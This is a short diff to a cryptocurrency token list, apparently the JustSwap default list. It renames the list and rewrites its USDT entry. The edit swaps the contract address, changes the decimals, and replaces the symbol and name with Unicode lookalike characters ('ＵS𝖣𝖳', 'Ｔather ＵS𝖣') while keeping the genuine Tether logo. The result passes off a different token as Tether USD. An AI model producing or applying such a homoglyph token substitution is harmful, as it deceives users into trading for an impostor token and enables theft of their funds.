@@ -1,5 +1,5 @@
 {
-    "name":"JustSwap Default List",
+    "name":"My List",
     "tokens":[
         {
             "symbol":"SUN",
@@ -90,11 +90,11 @@
             "logoURI":"https://coin.top/production/upload/logo/TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK.png"
         },
         {
-            "symbol":"USDT",
-            "address":"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            "symbol":"ＵS𝖣𝖳",
+            "address":"TUSM5JhYppnJtwbrXwzqBZ3JyRVP15jUED",
             "chainId":1,
-            "decimals":6,
-            "name":"Tether USD",
+            "decimals":18,
+            "name":"Ｔather ＵS𝖣 ",
             "logoURI":"https://coin.top/production/logo/usdtlogo.png"
         },
         {
